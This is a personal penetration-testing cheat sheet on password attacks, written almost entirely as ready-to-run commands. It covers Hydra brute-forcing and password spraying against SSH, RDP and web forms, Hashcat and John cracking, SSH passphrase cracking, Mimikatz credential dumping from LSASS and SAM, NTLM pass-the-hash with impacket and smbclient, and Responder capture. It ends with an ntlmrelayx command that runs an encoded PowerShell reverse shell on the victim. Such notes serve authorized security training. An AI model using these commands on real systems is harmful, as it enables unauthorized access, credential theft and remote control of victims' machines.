# Password attacks

Graphics card cracking: 
- https://openbenchmarking.org/test/pts/hashcat-1.0.0
- https://www.tomshardware.com/news/eight-rtx-4090s-can-break-passwords-in-under-an-hour

Check:
- https://scatteredsecrets.com/

## Hydra

On GitHub: https://github.com/vanhauser-thc/thc-hydra

### Wordlist

```
hydra -l user -P wordlist.txt -s PortVictim ssh://IpVictim
hydra -l user -P wordlist.txt rdp://IpVictim # default port is 3389
```

### Spraying

```
hydra -L userlist.txt -p "hackedpassword" rdp://IpVictim
```
Userlist on Kali: `/usr/share/wordlists/dirb/others/names.txt`

### Http

Check the source code to get the user and password field names:
```
hydra -P wordlist.txt $IpVictim http-post-form "/baseurl_like_index.html_or_php:user_form_field=admin:password_form_field=^PASS^:error message when password is wrong"
hydra -l user -P wordlist.txt http-get $IpVictim
```

## Hashcat

Benchmark: `-b`
Example of rule: https://hashcat.net/wiki/doku.php?id=rule_based_attack
```
: ---> do nothing
$1 ---> add '1' and the end
c $1 $2 $3 ---> capitalize, add '1', then '2', then '3' at the end
$ ---> append a whitespace
^ ---> prepend a whitespace
$1 c $! ---> append '1', then capitalize, then add '!' at the end
$2 c $! ---> append '2', then capitalize, then add '!' at the end
$1 $2 $3 c $! ---> append '1', then '2', then '3', then capitalize, then append '!'
```
Usage:
```
hashcat -r rulefile.rule wordlist.txt --stdout
hashcat -m 0 tocrackfile.txt wordlist.txt -r rulefile.rule --force # MD5 hash (-m 0), ignore GPU warnings (--force)

hastcat wordlist.txt -r rulelist.txt --stdout
hashcat wordlist.txt -j 'd' wordlist.txt --stdout > newwordlist.txt
hashcat -m 0 tocrack.txt -k 'u' newwordlist.txt --force
hashcat -m passman.mode passman.hash rockyou.txt -r rockyou-30000.rule --force
```
Common rules: `/usr/share/hashcat/rules/` (for rockyou: `rockyou-30000.rule`)

## Ssh passphrase

```
ssh2john id_rsa > ssh.hash
hashcat -h | grep -i "ssh"
hashcat -m ssh.hashcat.mode ssh.hash ssh.passwords -r ssh.rule --force
cp ssh.rule /etc/john/otherssh.rule
vim /etc/john/john.config
john --wordlist=ssh.passwords --rules=sshJohnRules ssh.hash
```

---

## Mimikatz

Password modules:
- extraction from [LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service): `sekurlsa::logonpasswords`
- dump: `lsadump::sam` (lighter)

Access right needed:
- extraction: __SeDebugPrivilege__
- privilege escalation ("impersonation"): __SeImpersonatePrivilege__ (e.g. local administrators)

Commands:
```
mimikatz # privilege::debug # with SeDebugPrivilege access rights
mimikatz # token::elevate # with SeImpersonatePrivilege access rights
mimikatz # lsadump::sam # hash dump
```

## NTLM hash cracking

On Windows:
```
PS> Get-LocalUser
PS> c:\path\to\mimikatz.exe
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
```
Take the hashes back to Kali:
```
hashcat -h | grep -i ntlm # get the NTLM code: 1000
hashcat -m ntlm_mode_code user_hash.txt /u/s/w/rockyou.txt -r /u/s/h/r/best64.rule --force
```

## Pass NTLM

```
smbclient \\\\IpVictim\\someshare -U Administrator --pw-nt-hash adminhash # smb> get file.txt
impacket-psexec -hashes 00000000000000000000000000000000:adminhash Administrator@IpVictim # nt authority\system
impacket-wmiexec -hashes 00000000000000000000000000000000:adminhash Administrator@IpVictim # host\administrator

```

## Net-NTLMv2

Kali
```
sudo responder -I ethX
```
Windows
```
smb \\IpAtt\fakeshare
```
then `hashcat`

## Relay Net-NTLMv2

```
sudo impacket-ntlmrelayx --no-http-server -smb2support -t IpVictim -c "powershell -enc base64reverseshell"
```
